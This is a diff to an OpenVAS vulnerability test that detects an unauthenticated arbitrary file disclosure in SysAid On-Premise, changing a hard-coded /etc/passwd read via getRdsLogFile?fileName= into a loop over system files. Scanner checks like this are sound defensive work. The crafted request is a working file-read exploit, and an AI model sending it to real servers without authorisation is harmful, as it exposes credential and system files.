@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_sysaid_file_disclosure_vuln.nasl 11492 2018-09-20 08:38:50Z mmartin $
+# $Id: gb_sysaid_file_disclosure_vuln.nasl 11831 2018-10-11 07:49:24Z jschulte $
 #
 # SysAid Server Arbitrary File Disclosure Vulnerability
 #
@@ -30,8 +30,8 @@ CPE = 'cpe:/a:sysaid:sysaid';
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.105938");
-  script_version("$Revision: 11492 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-20 10:38:50 +0200 (Thu, 20 Sep 2018) $");
+  script_version("$Revision: 11831 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-11 09:49:24 +0200 (Thu, 11 Oct 2018) $");
   script_tag(name:"creation_date", value:"2015-01-13 16:45:50 +0700 (Tue, 13 Jan 2015)");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
@@ -48,15 +48,15 @@ if (description)
   script_mandatory_keys("sysaid/installed");
 
   script_tag(name:"summary", value:"SysAid On-Premise is prone to an arbitrary file
-disclosure vulnerability.");
+  disclosure vulnerability.");
 
   script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");
 
   script_tag(name:"insight", value:"SysAid On-Premise is vulnerable to an unauthenticated file
-disclosure attack in the fileName parameter of getRdsLogFile.");
+  disclosure attack in the fileName parameter of getRdsLogFile.");
 
   script_tag(name:"impact", value:"An unauthenticated attacker may read arbitrary files which may contain
-sensitive information.");
+  sensitive information.");
 
   script_tag(name:"affected", value:"SysAid On-Premise before 14.4.2.");
 
@@ -74,6 +74,7 @@ sensitive information.");
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
+include("misc_func.inc");
 
 if (!port = get_app_port(cpe: CPE))
   exit(0);
@@ -92,21 +93,29 @@ sessionid = eregmatch(string:res, pattern:"JSESSIONID=([^;]+)");
 if (isnull(sessionid[1]))
   exit(0);
 
-url = dir + '/getRdsLogFile?fileName=/etc/passwd';
-req = 'GET ' + url + ' HTTP/1.1\r\n' +
-      'Host: ' + http_host_name(port: port) + '\r\n' +
-      'User-Agent: ' + useragent + '\r\n' +
-      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
-      'Accept-Language: en-US,en;q=0.5\r\n' +
-      'Accept-Encoding: gzip, deflate\r\n' +
-      'Cookie: JSESSIONID=' + sessionid[1] + '\r\n' +
-      'Connection: keep-alive\r\n\r\n';
+files = traversal_files("linux");
 
-res = http_keepalive_send_recv(port:port, data:req);
+foreach pattern(keys(files)) {
 
-if (res && res =~ "root:.*:0:[01]:") {
-  security_message(port:port);
-  exit(0);
+  file = files[pattern];
+
+  url = dir + '/getRdsLogFile?fileName=/' + file;
+  req = 'GET ' + url + ' HTTP/1.1\r\n' +
+        'Host: ' + http_host_name(port: port) + '\r\n' +
+        'User-Agent: ' + useragent + '\r\n' +
+        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
+        'Accept-Language: en-US,en;q=0.5\r\n' +
+        'Accept-Encoding: gzip, deflate\r\n' +
+        'Cookie: JSESSIONID=' + sessionid[1] + '\r\n' +
+        'Connection: keep-alive\r\n\r\n';
+
+  res = http_keepalive_send_recv(port:port, data:req);
+
+  if (res && egrep(string:res, pattern:pattern)) {
+    report = report_vuln_url(url:url);
+    security_message(data:report, port:port);
+    exit(0);
+  }
 }
 
 exit(99);
